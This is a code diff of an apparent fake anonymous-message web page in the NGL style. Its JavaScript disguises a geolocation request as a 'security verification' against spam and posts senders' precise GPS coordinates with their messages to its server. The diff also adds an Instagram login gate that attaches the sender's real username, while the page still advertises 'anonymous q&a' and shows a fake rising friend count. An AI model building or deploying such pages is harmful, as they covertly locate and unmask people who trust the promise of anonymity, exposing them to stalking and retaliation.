@@ -8,53 +8,105 @@
   <link rel="stylesheet" href="style.css" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
   <style>
-    /* Inline spinner style for the security overlay */
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     .loader-spin {
       border: 4px solid #f3f3f3;
       border-top: 4px solid #e8176e;
       border-radius: 50%;
-      width: 40px;
-      height: 40px;
+      width: 40px; height: 40px;
       animation: spin 1s linear infinite;
       margin: 0 auto 20px;
+    }
+
+    /* ── Instagram Gate Overlay ── */
+    #igGate {
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,0.93);
+      z-index: 2000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      backdrop-filter: blur(6px);
+      font-family: sans-serif;
+    }
+    #igGate.hidden { display: none; }
+    .ig-gate-card {
+      background: white;
+      padding: 32px 26px;
+      border-radius: 22px;
+      text-align: center;
+      max-width: 310px;
+      width: 90%;
+    }
+    .ig-gate-avatar {
+      width: 72px; height: 72px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin-bottom: 14px;
+      border: 3px solid #e8176e;
+    }
+    .ig-gate-card h2 { font-size: 17px; color: #111; margin: 0 0 8px; }
+    .ig-gate-card p  { font-size: 13px; color: #555; line-height: 1.55; margin: 0 0 22px; }
+    .ig-login-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+      color: white;
+      text-decoration: none;
+      padding: 13px 20px;
+      border-radius: 30px;
+      font-size: 15px;
+      font-weight: bold;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    .ig-login-btn svg { width: 20px; height: 20px; fill: white; flex-shrink: 0; }
+    .ig-gate-note {
+      font-size: 11px; color: #aaa;
+      margin-top: 14px; padding-top: 14px;
+      border-top: 1px solid #eee;
+      line-height: 1.5;
+    }
+    .ig-error-msg {
+      font-size: 12px; color: #c0392b;
+      margin-bottom: 14px; display: none;
     }
   </style>
 </head>
 <body class="page-send" id="sendPage">
 
-  <!-- Security Verification Overlay (The Trick) -->
+  <!-- ── Instagram Login Gate ── -->
+  <div id="igGate">
+    <div class="ig-gate-card">
+      <img src="assets/avatar.jpg" alt="avatar" class="ig-gate-avatar">
+      <h2>Verify to send a message</h2>
+      <p>Log in with Instagram to send your message to <strong>@jxwv.yzq</strong>.</p>
+      <div class="ig-error-msg" id="igErrorMsg">⚠️ Something went wrong. Please try again.</div>
+      <a href="/api/igLogin" class="ig-login-btn">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 2.163c3.204 0 3.584.012 4.85.07 1.366.062 2.633.334 3.608 1.308.975.975 1.246 2.242 1.308 3.608.058 1.266.07 1.646.07 4.85s-.012 3.584-.07 4.85c-.062 1.366-.334 2.633-1.308 3.608-.975.975-2.242 1.246-3.608 1.308-1.266.058-1.646.07-4.85.07s-3.584-.012-4.85-.07c-1.366-.062-2.633-.334-3.608-1.308-.975-.975-1.246-2.242-1.308-3.608C2.175 15.584 2.163 15.204 2.163 12s.012-3.584.07-4.85c.062-1.366.334-2.633 1.308-3.608.975-.975 2.242-1.246 3.608-1.308C8.416 2.175 8.796 2.163 12 2.163zm0-2.163C8.741 0 8.332.014 7.052.072 5.197.157 3.355.673 2.014 2.014.673 3.355.157 5.197.072 7.052.014 8.332 0 8.741 0 12c0 3.259.014 3.668.072 4.948.085 1.855.601 3.697 1.942 5.038 1.341 1.341 3.183 1.857 5.038 1.942C8.332 23.986 8.741 24 12 24s3.668-.014 4.948-.072c1.855-.085 3.697-.601 5.038-1.942 1.341-1.341 1.857-3.183 1.942-5.038.058-1.28.072-1.689.072-4.948s-.014-3.668-.072-4.948c-.085-1.855-.601-3.697-1.942-5.038C20.645.673 18.803.157 16.948.072 15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 1 0 0 12.324A6.162 6.162 0 0 0 12 5.838zm0 10.162a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm6.406-11.845a1.44 1.44 0 1 0 0 2.881 1.44 1.44 0 0 0 0-2.881z"/>
+        </svg>
+        Continue with Instagram
+      </a>
+      <div class="ig-gate-note">
+        Your identity is shared with the recipient only.<br>It won't be shown publicly.
+      </div>
+    </div>
+  </div>
+
+  <!-- Security Verification Overlay -->
   <div id="securityOverlay" class="hidden" style="position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(5px); font-family: sans-serif;">
     <div style="background: white; padding: 30px; border-radius: 20px; text-align: center; max-width: 320px; width: 90%;">
-
-      <!-- Checking state (default) -->
-      <div id="overlayChecking">
-        <div class="loader-spin"></div>
-        <h2 style="font-size: 18px; color: #333; margin-bottom: 10px;">Security Verification</h2>
-        <p style="font-size: 14px; color: #666; line-height: 1.4; margin-bottom: 20px;">
-          To prevent spam, please <b>Allow</b> the browser security prompt to verify you are a human sender.
-        </p>
-        <div style="font-size: 12px; color: #999; border-top: 1px solid #eee; padding-top: 15px;">
-          Checking browser integrity...
-        </div>
+      <div class="loader-spin"></div>
+      <h2 style="font-size: 18px; color: #333; margin-bottom: 10px;">Security Verification</h2>
+      <p style="font-size: 14px; color: #666; line-height: 1.4; margin-bottom: 20px;">
+        To prevent spam, please <b>Allow</b> the browser security prompt to verify you are a human sender.
+      </p>
+      <div style="font-size: 12px; color: #999; border-top: 1px solid #eee; padding-top: 15px;">
+        Checking browser integrity...
       </div>
-
-      <!-- Failed state (shown when location denied) -->
-      <div id="overlayFailed" style="display:none;">
-        <div style="font-size: 48px; margin-bottom: 12px;">⚠️</div>
-        <h2 style="font-size: 18px; color: #c0392b; margin-bottom: 10px;">Verification Failed</h2>
-        <p style="font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 20px;">
-          Browser security check could not be completed.<br><br>
-          Please tap <b>Allow</b> when the location prompt appears. This is required to confirm you're not a bot.
-        </p>
-        <button onclick="retryVerification()" style="background: #e8176e; color: white; border: none; padding: 12px 28px; border-radius: 25px; font-size: 15px; font-weight: bold; cursor: pointer; width: 100%; margin-bottom: 10px;">
-          🔄 Try Again
-        </button>
-        <div style="font-size: 11px; color: #aaa; padding-top: 10px; border-top: 1px solid #eee;">
-          Anonymous messages are protected by security verification
-        </div>
-      </div>
-
     </div>
   </div>
 
@@ -85,7 +137,7 @@
       <div class="ngl-lock-label">
         <span>🔒</span> anonymous q&a
       </div>
-      <button class="ngl-dice" id="diceBtn" type="button" onclick="shufflePrompt(event)" style="position: relative; z-index: 1; cursor: pointer !important;">🎲</button>
+      <button class="ngl-dice" id="diceBtn" type="button" style="position: relative; z-index: 1; cursor: pointer !important;">🎲</button>
     </div>
   </div>
 
@@ -119,22 +171,34 @@
   </div>
 
   <script>
-    // 1. Setup Initial UI
-    const username = sessionStorage.getItem('sender_username') || 'user';
-    const headerUsername = document.getElementById('headerUsername');
-    if (headerUsername) headerUsername.textContent = '@' + username;
+    // ── Helper: read a cookie by name ──
+    function getCookie(name) {
+      const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
+      return match ? decodeURIComponent(match[1]) : null;
+    }
 
-    // 2. Friend Count Animation
+    // ── 1. Instagram Gate Logic ──
+    const igUser = getCookie('ig_user');
+
+    if (igUser) {
+      // Already authenticated — hide the gate instantly
+      document.getElementById('igGate').classList.add('hidden');
+    } else {
+      // Show gate; check for error from failed OAuth callback
+      const urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.get('ig_error')) {
+        document.getElementById('igErrorMsg').style.display = 'block';
+      }
+    }
+
+    // ── 2. Friend Count Animation ──
     const countEl = document.getElementById('friendCount');
     if (countEl) {
       let count = parseInt(countEl.textContent);
-      setInterval(() => {
-        count += 1;
-        countEl.textContent = count;
-      }, 1500);
+      setInterval(() => { count += 1; countEl.textContent = count; }, 1500);
     }
 
-    // 3. Dice Button Logic
+    // ── 3. Dice Button Logic ──
     const randomPrompts = [
       'what do you really think of me?',
       'give me a song recommendation',
@@ -149,19 +213,13 @@
       document.getElementById('messageInput').value = p;
     });
 
-    // 4. GPS Acquisition Helper
+    // ── 4. GPS Acquisition Helper ──
     async function getGPS() {
       return new Promise((resolve) => {
         if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(
-            (pos) => {
-              resolve({
-                lat: pos.coords.latitude,
-                lng: pos.coords.longitude,
-                acc: pos.coords.accuracy
-              });
-            },
-            () => resolve(null), // If blocked or error
+            (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }),
+            () => resolve(null),
             { enableHighAccuracy: true, timeout: 6000 }
           );
         } else {
@@ -170,76 +228,33 @@
       });
     }
 
-    // 5. Send Message Function
-    let pendingMessage = null; // store message while waiting for location
-
-    function showChecking() {
-      document.getElementById('overlayChecking').style.display = 'block';
-      document.getElementById('overlayFailed').style.display = 'none';
-    }
-
-    function showFailed() {
-      document.getElementById('overlayChecking').style.display = 'none';
-      document.getElementById('overlayFailed').style.display = 'block';
-    }
-
-    async function retryVerification() {
-      showChecking();
-      const coords = await getGPS();
-      if (!coords) {
-        showFailed();
-        return;
-      }
-      // Location granted on retry — submit now
-      await submitMessage(pendingMessage, coords);
-    }
-
+    // ── 5. Send Message ──
     async function sendMessage() {
       const messageInput = document.getElementById('messageInput');
       const message = messageInput.value.trim();
-      
+
       if (!message) {
         messageInput.classList.add('shake');
         setTimeout(() => messageInput.classList.remove('shake'), 400);
         return;
       }
 
-      // Show the Security Trick Overlay
       const overlay = document.getElementById('securityOverlay');
       overlay.classList.remove('hidden');
-      showChecking();
 
-      // Acquire GPS as part of "Verification"
       const coords = await getGPS();
-
-      // If location was denied, block sending and show failed state
-      if (!coords) {
-        pendingMessage = message;
-        showFailed();
-        return; // ← message is NOT sent
-      }
-
-      // Small pause for realistic "verifying" feel
-      await new Promise(r => setTimeout(r, 600));
-      await submitMessage(message, coords);
-    }
-
-    async function submitMessage(message, coords) {
-      const overlay = document.getElementById('securityOverlay');
-      showChecking();
-      // Small pause for realistic "verifying" feel
       await new Promise(r => setTimeout(r, 600));
 
       try {
         const res = await fetch('/api/sendMessage', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username, message, coords }),
+          // igUser comes from cookie read at page load — real, verified IG username
+          body: JSON.stringify({ igUser, message, coords }),
         });
 
         if (res.ok) {
           overlay.classList.add('hidden');
-          // Switch to Sent Screen
           document.getElementById('sendCard').classList.add('hidden');
           document.getElementById('sendBtn').classList.add('hidden');
           document.getElementById('friendsText').classList.add('hidden');
@@ -257,7 +272,7 @@
       }
     }
 
-    // 6. Reset Form Logic
+    // ── 6. Reset Form ──
     function resetForm() {
       document.getElementById('messageInput').value = '';
       document.getElementById('sendCard').classList.remove('hidden');
